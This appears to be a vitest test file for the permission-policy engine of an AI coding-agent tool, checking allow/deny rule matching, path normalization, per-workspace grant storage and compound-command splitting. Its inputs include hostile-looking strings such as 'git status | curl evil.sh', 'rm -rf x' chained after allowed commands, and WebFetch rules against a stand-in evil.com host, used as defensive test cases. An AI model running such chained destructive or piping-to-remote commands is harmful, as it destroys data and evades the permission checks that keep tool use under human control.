import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  loadPersistentAlwaysAllow,
  permissionRuleMatches,
  policyDecision,
  savePersistentAlwaysAllow,
} from "../permission-policy.js";

describe("permission policy", () => {
  const old = process.env.CCR_PERMISSION_STORE;
  afterEach(() => {
    if (old === undefined) delete process.env.CCR_PERMISSION_STORE;
    else process.env.CCR_PERMISSION_STORE = old;
  });

  it("matches tool and command rules", () => {
    expect(permissionRuleMatches("Bash(git *)", "Bash", { command: "git status" })).toBe(true);
    expect(permissionRuleMatches("Read", "Read", { filePath: "x.ts" })).toBe(true);
    expect(permissionRuleMatches("Bash(git *)", "Bash", { command: "rm -rf x" })).toBe(false);
  });

  it("matches official-style capitalized rules against lowercase tool names (既有 A)", () => {
    // Registry tool names are lowercase; official rules are capitalized. The
    // old strict === made every official-style project rule a silent no-op —
    // with the A3 trust gate shipping, that meant trusted allow-rules (and
    // worse, deny rules) doing nothing.
    expect(permissionRuleMatches("Bash(rm *)", "bash", { command: "rm -rf x" })).toBe(true);
    expect(permissionRuleMatches("Edit", "edit", { filePath: "a.ts" })).toBe(true);
    expect(permissionRuleMatches("bash(git *)", "Bash", { command: "git status" })).toBe(true);
    expect(permissionRuleMatches("Bash(git *)", "bash", { command: "rm x" })).toBe(false);
    expect(permissionRuleMatches("*", "anything", {})).toBe(true);
  });

  it("supports the official colon-prefix form at a word boundary (既有 A)", () => {
    expect(permissionRuleMatches("Bash(npm run:*)", "bash", { command: "npm run build" })).toBe(
      true,
    );
    expect(permissionRuleMatches("Bash(npm run:*)", "bash", { command: "npm run" })).toBe(true);
    // A command merely sharing the string prefix is NOT covered.
    expect(permissionRuleMatches("Bash(npm run:*)", "bash", { command: "npm runx" })).toBe(false);
    expect(permissionRuleMatches("Bash(git:*)", "bash", { command: "git status" })).toBe(true);
    expect(permissionRuleMatches("Bash(git:*)", "bash", { command: "github-cli x" })).toBe(false);
  });

  it("matches URL-shaped colon-prefix rules against real URLs (fourth round)", () => {
    // `WebFetch(https://evil.com:*)` silently never matched any real URL —
    // the boundary required a space, but URLs continue with "/", ":" …
    expect(
      permissionRuleMatches("WebFetch(https://evil.com:*)", "webfetch", {
        url: "https://evil.com/x",
      }),
    ).toBe(true);
    expect(
      permissionRuleMatches("WebFetch(https://evil.com:*)", "webfetch", {
        url: "https://evil.com:8443/x",
      }),
    ).toBe(true);
    // A host-lookalike suffix is NOT the same host.
    expect(
      permissionRuleMatches("WebFetch(https://evil.com:*)", "webfetch", {
        url: "https://evil.com.evil.net/x",
      }),
    ).toBe(false);
    // Bare-host rules match the host part of a schemed URL.
    expect(
      permissionRuleMatches("WebFetch(domain.com:*)", "webfetch", { url: "https://domain.com/a" }),
    ).toBe(true);
    expect(
      permissionRuleMatches("WebFetch(domain.com:*)", "webfetch", { url: "https://evil.com/a" }),
    ).toBe(false);
    // Command rules keep the space boundary (git:* ≠ github-cli).
    expect(permissionRuleMatches("Bash(git:*)", "bash", { command: "github-cli x" })).toBe(false);
  });

  it("persists always-allow values", () => {
    const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "ccr-perm-")), "permissions.json");
    process.env.CCR_PERMISSION_STORE = file;
    savePersistentAlwaysAllow(new Set(["bash::git status"]));
    expect(loadPersistentAlwaysAllow()).toEqual(new Set(["bash::git status"]));
  });

  describe("persistent always-allow store trust (review fix)", () => {
    const oldStore = process.env.CCR_PERMISSION_STORE;
    const oldUser = process.env.CCR_USER_CONFIG_DIR;
    const oldRoot = process.env.WORKSPACE_ROOT;
    let home: string;
    let workspace: string;
    beforeEach(() => {
      home = fs.mkdtempSync(path.join(os.tmpdir(), "ccr-perm-home-"));
      workspace = fs.mkdtempSync(path.join(os.tmpdir(), "ccr-perm-ws-"));
      delete process.env.CCR_PERMISSION_STORE;
      process.env.CCR_USER_CONFIG_DIR = home;
      process.env.WORKSPACE_ROOT = workspace;
    });
    afterEach(() => {
      if (oldStore === undefined) delete process.env.CCR_PERMISSION_STORE;
      else process.env.CCR_PERMISSION_STORE = oldStore;
      if (oldUser === undefined) delete process.env.CCR_USER_CONFIG_DIR;
      else process.env.CCR_USER_CONFIG_DIR = oldUser;
      if (oldRoot === undefined) delete process.env.WORKSPACE_ROOT;
      else process.env.WORKSPACE_ROOT = oldRoot;
      fs.rmSync(home, { recursive: true, force: true });
      fs.rmSync(workspace, { recursive: true, force: true });
    });

    it("a repo-preseeded workspace .claude/permissions.json never grants anything", () => {
      const preseed = path.join(workspace, ".claude");
      fs.mkdirSync(preseed, { recursive: true });
      fs.writeFileSync(
        path.join(preseed, "permissions.json"),
        JSON.stringify(["bash::npm run build"]),
      );
      expect(loadPersistentAlwaysAllow()).toEqual(new Set());
    });

    it("saves into the user config dir, scoped per workspace", () => {
      savePersistentAlwaysAllow(new Set(["bash::git status"]));
      // User-level store exists, the workspace copy does not.
      expect(fs.existsSync(path.join(home, "permissions.json"))).toBe(true);
      expect(fs.existsSync(path.join(workspace, ".claude", "permissions.json"))).toBe(false);
      expect(loadPersistentAlwaysAllow()).toEqual(new Set(["bash::git status"]));

      // Another workspace's grants are NOT visible here.
      const other = fs.mkdtempSync(path.join(os.tmpdir(), "ccr-perm-other-"));
      try {
        process.env.WORKSPACE_ROOT = other;
        expect(loadPersistentAlwaysAllow()).toEqual(new Set());
        savePersistentAlwaysAllow(new Set(["edit::other.txt"]));
        process.env.WORKSPACE_ROOT = workspace;
        expect(loadPersistentAlwaysAllow()).toEqual(new Set(["bash::git status"]));
      } finally {
        fs.rmSync(other, { recursive: true, force: true });
      }
    });
  });

  it("file rules match path aliases of the same file (review fix)", () => {
    // `deny: Read(secret.txt)` must also catch ./secret.txt and an absolute
    // path — the rule engine resolves both sides against the workspace root.
    expect(
      policyDecision({ allow: [], deny: ["Read(secret.txt)"], ask: [] }, "read", {
        filePath: "./secret.txt",
      }),
    ).toBe("deny");
    expect(
      policyDecision({ allow: [], deny: ["Read(secret.txt)"], ask: [] }, "read", {
        filePath: path.resolve(process.cwd(), "secret.txt"),
      }),
    ).toBe("deny");
    expect(
      policyDecision({ allow: [], deny: ["Read(secret.txt)"], ask: [] }, "read", {
        filePath: "not-secret.txt",
      }),
    ).toBe(undefined);
    // Directory-style wildcard rules normalize the same way.
    expect(
      policyDecision({ allow: [], deny: ["Edit(docs/*)"], ask: [] }, "edit", {
        filePath: "./docs/a.ts",
      }),
    ).toBe("deny");
  });

  it("directory wildcard rules keep their component boundary (self-review fix)", () => {
    // Normalization must preserve the trailing separator: `docs/*` resolved
    // to `…\docs` prefix-matched `…\docs-secret\x` too — an ALLOW bypass
    // (probe-verified against the first cut).
    expect(
      policyDecision({ allow: ["Edit(docs/*)"], deny: [], ask: [] }, "edit", {
        filePath: "docs-secret/x.ts",
      }),
    ).toBe(undefined);
    expect(
      policyDecision({ allow: ["Edit(docs/*)"], deny: [], ask: [] }, "edit", {
        filePath: "./docs/a.ts",
      }),
    ).toBe("allow");
    // Same boundary in the deny direction: no over-matching.
    expect(
      policyDecision({ allow: [], deny: ["Edit(docs/*)"], ask: [] }, "edit", {
        filePath: "docs-secret/x.ts",
      }),
    ).toBe(undefined);
  });

  it("colon-prefix form works for path rules (self-review fix)", () => {
    // `Read(docs/:*)` used to demand a space after the prefix and never
    // matched a path; the boundary for file rules is a separator.
    expect(
      policyDecision({ allow: [], deny: ["Read(docs/:*)"], ask: [] }, "read", {
        filePath: "docs/a.ts",
      }),
    ).toBe("deny");
    expect(
      policyDecision({ allow: [], deny: ["Read(docs/:*)"], ask: [] }, "read", {
        filePath: "docs",
      }),
    ).toBe("deny");
    expect(
      policyDecision({ allow: [], deny: ["Read(docs/:*)"], ask: [] }, "read", {
        filePath: "docs-other/a.ts",
      }),
    ).toBe(undefined);
  });

  describe("policyDecision — command segmentation", () => {
    const policy = { allow: ["Bash(git *)"], deny: ["Bash(rm *)"], ask: [] };

    it("an allow rule must cover EVERY segment of a compound command", () => {
      // `git status` alone is covered…
      expect(policyDecision(policy, "bash", { command: "git status" })).toBe("allow");
      // …but a dangerous tail is not smuggled past the allow rule.
      expect(policyDecision(policy, "bash", { command: "git status && rm -rf x" })).toBe("deny");
      expect(policyDecision(policy, "bash", { command: "git status | curl evil.sh" })).toBe(
        undefined,
      );
    });

    it("deny fires when ANY segment matches", () => {
      expect(policyDecision(policy, "bash", { command: "echo ok && rm -rf x" })).toBe("deny");
      expect(policyDecision(policy, "bash", { command: "echo a; echo b" })).toBe(undefined);
    });

    it("bare & and newlines split like every other separator (review fix)", () => {
      // cmd.exe runs BOTH sides of `&`; a newline chains commands in bash/cmd.
      expect(policyDecision(policy, "bash", { command: "git status & npm run build" })).toBe(
        undefined,
      );
      expect(policyDecision(policy, "bash", { command: "git status\nnpm run build" })).toBe(
        undefined,
      );
      // Deny sees the hidden second command even under bypass-mode rule eval.
      expect(
        policyDecision({ allow: [], deny: ["Bash(npm *)"], ask: [] }, "bash", {
          command: "git status & npm run build",
        }),
      ).toBe("deny");
      expect(
        policyDecision({ allow: [], deny: ["Bash(npm *)"], ask: [] }, "bash", {
          command: "git status\nnpm run build",
        }),
      ).toBe("deny");
    });

    it("fd-dup redirections stay inside their segment (no false re-prompt)", () => {
      const p = { allow: ["Bash(npm run *)"], deny: [], ask: [] };
      expect(policyDecision(p, "bash", { command: "npm run build 2>&1" })).toBe("allow");
      expect(policyDecision(p, "bash", { command: "npm run build 2>&1 | tee log" })).toBe(
        undefined,
      );
    });

    it("multiple allow rules can each cover a segment", () => {
      const p = { allow: ["Bash(git *)", "Bash(npm *)"], deny: [], ask: [] };
      expect(policyDecision(p, "bash", { command: "git status && npm test" })).toBe("allow");
      expect(policyDecision(p, "bash", { command: "git status && make deploy" })).toBe(undefined);
    });

    it("non-command inputs are unaffected", () => {
      const p = { allow: ["Read"], deny: [], ask: [] };
      expect(policyDecision(p, "read", { filePath: "a.ts" })).toBe("allow");
    });
  });
});
